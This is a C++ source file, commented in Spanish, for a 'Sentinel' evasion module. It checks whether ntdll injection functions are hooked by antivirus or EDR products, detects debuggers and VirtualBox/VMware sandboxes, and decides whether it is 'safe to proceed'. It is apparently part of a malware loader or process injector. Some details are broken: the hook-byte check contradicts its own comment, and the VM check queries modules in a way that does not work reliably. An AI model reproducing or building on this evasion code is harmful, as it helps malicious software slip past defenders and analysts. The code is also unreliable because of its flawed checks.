#include "Telemetry.h"
#include <iostream>

bool Sentinel::CheckForEDRHooks() {
    // Lista de funciones críticas que el Sentinel debe vigilar
    const char* criticalFunctions[] = {
        "NtWriteVirtualMemory",
        "NtAllocateVirtualMemory",
        "NtProtectVirtualMemory",
        "NtCreateThreadEx"
    };

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return true; // Si no hay ntdll, algo va muy mal

    for (const char* funcName : criticalFunctions) {
        PVOID pFunc = GetProcAddress(hNtdll, funcName);
        if (pFunc) {
            // Un byte 0xE9 (JMP) o 0x48 0xB8 (MOV RAX, ...) al inicio 
            // de la función indica un "Inline Hook" de un antivirus.
            unsigned char firstByte = *(unsigned char*)pFunc;
            if (firstByte == 0xE9 || firstByte == 0x4C) { 
                return true; // Hook detectado
            }
        }
    }
    return false;
}

bool Sentinel::CheckForSandboxes() {
    // Detección básica de VM por nombre de dispositivo
    // En la versión final 2026, esto incluiría comprobaciones de tiempo (TSC)
    if (GetModuleHandleA("VBoxGuest.sys") || GetModuleHandleA("vmtoolsd.exe")) {
        return true;
    }
    return false;
}

SystemHeat Sentinel::AnalyzeEnvironment() {
    SystemHeat heat = { 0 };
    
    heat.isHooked = CheckForEDRHooks();
    heat.isDebuggerPresent = IsDebuggerPresent();
    heat.isSandbox = CheckForSandboxes();

    // Cálculo del nivel de amenaza
    if (heat.isHooked) heat.threatLevel += 60;
    if (heat.isDebuggerPresent) heat.threatLevel += 40;
    if (heat.isSandbox) heat.threatLevel += 20;

    return heat;
}

bool Sentinel::IsSafeToProceed(SystemHeat heat) {
    // Solo procedemos si el nivel de "calor" es bajo
    return (heat.threatLevel < 50);
}